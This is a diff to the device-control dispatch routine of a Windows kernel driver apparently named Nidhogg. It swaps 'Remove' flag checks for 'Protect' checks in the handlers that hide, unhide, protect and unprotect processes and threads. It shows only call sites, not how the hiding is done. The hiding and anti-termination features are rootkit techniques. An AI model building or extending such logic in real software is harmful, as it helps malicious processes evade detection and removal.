@@ -41,21 +41,21 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		if (data->Remove) {
-			if (!NidhoggProcessHandler->RemoveProcess(data->Pid, ProcessType::Protected)) {
-				Print(DRIVER_PREFIX "Did not find process with pid %d in protected list.\n", data->Pid);
-				status = STATUS_NOT_FOUND;
-				break;
-			}
-			Print(DRIVER_PREFIX "Unprotecting process with pid %d.\n", data->Pid);
-		}
-		else {
+		if (data->Protect) {
 			if (!NidhoggProcessHandler->ProtectProcess(data->Pid)) {
 				Print(DRIVER_PREFIX "Failed to protect process with pid %d.\n", data->Pid);
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
 			Print(DRIVER_PREFIX "Protected process with pid %d.\n", data->Pid);
+		}
+		else {
+			if (!NidhoggProcessHandler->RemoveProcess(data->Pid, ProcessType::Protected)) {
+				Print(DRIVER_PREFIX "Did not find process with pid %d in protected list.\n", data->Pid);
+				status = STATUS_NOT_FOUND;
+				break;
+			}
+			Print(DRIVER_PREFIX "Unprotecting process with pid %d.\n", data->Pid);
 		}
 
 		len += size;
@@ -108,16 +108,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		if (data->Remove) {
-			status = NidhoggProcessHandler->UnhideProcess(data->Pid);
-
-			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to unhide process with pid %d: (0x%08X).\n", data->Pid, status);
-				break;
-			}
-			Print(DRIVER_PREFIX "Revealed process with pid %d.\n", data->Pid);
-		}
-		else {
+		if (data->Protect) {
 			status = NidhoggProcessHandler->HideProcess(data->Pid);
 
 			if (!NT_SUCCESS(status)) {
@@ -125,6 +116,15 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 				break;
 			}
 			Print(DRIVER_PREFIX "Hid process with pid %d.\n", data->Pid);
+		}
+		else {
+			status = NidhoggProcessHandler->UnhideProcess(data->Pid);
+
+			if (!NT_SUCCESS(status)) {
+				Print(DRIVER_PREFIX "Failed to unhide process with pid %d: (0x%08X).\n", data->Pid, status);
+				break;
+			}
+			Print(DRIVER_PREFIX "Revealed process with pid %d.\n", data->Pid);
 		}
 
 		len += size;
@@ -242,18 +242,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		if (data->Remove) {
-			status = NidhoggThreadHandler->RemoveThread(data->Tid, ThreadType::Protected) ?
-				STATUS_SUCCESS : STATUS_NOT_FOUND;
-			
-			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to unprotect thread with tid %d: (0x%08X)\n", data->Tid, status);
-				break;
-			}
-			Print(DRIVER_PREFIX "Unprotected thread with tid %d\n", data->Tid);
-			break;
-		}
-		else {
+		if (data->Protect) {
 			status = NidhoggThreadHandler->ProtectThread(data->Tid) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
 
 			if (!NT_SUCCESS(status)) {
@@ -261,6 +250,16 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 				break;
 			}
 			Print(DRIVER_PREFIX "Protecting thread with tid %d\n", data->Tid);
+		}
+		else {
+			status = NidhoggThreadHandler->RemoveThread(data->Tid, ThreadType::Protected) ?
+				STATUS_SUCCESS : STATUS_NOT_FOUND;
+
+			if (!NT_SUCCESS(status)) {
+				Print(DRIVER_PREFIX "Failed to unprotect thread with tid %d: (0x%08X)\n", data->Tid, status);
+				break;
+			}
+			Print(DRIVER_PREFIX "Unprotected thread with tid %d\n", data->Tid);
 		}
 
 		len += size;
@@ -282,16 +281,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		if (data->Remove) {
-			status = NidhoggThreadHandler->UnhideThread(data->Tid);
-
-			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to unhide thread with tid %d: (0x%08X)\n", data->Tid, status);
-				break;
-			}
-			Print(DRIVER_PREFIX "Unhiding thread with tid %d\n", data->Tid);
-		}
-		else {
+		if (data->Protect) {
 			status = NidhoggThreadHandler->HideThread(data->Tid);
 
 			if (!NT_SUCCESS(status)) {
@@ -299,6 +289,15 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 				break;
 			}
 			Print(DRIVER_PREFIX "Hiding thread with tid %d\n", data->Tid);
+		}
+		else {
+			status = NidhoggThreadHandler->UnhideThread(data->Tid);
+
+			if (!NT_SUCCESS(status)) {
+				Print(DRIVER_PREFIX "Failed to unhide thread with tid %d: (0x%08X)\n", data->Tid, status);
+				break;
+			}
+			Print(DRIVER_PREFIX "Unhiding thread with tid %d\n", data->Tid);
 		}
 
 		len += size;
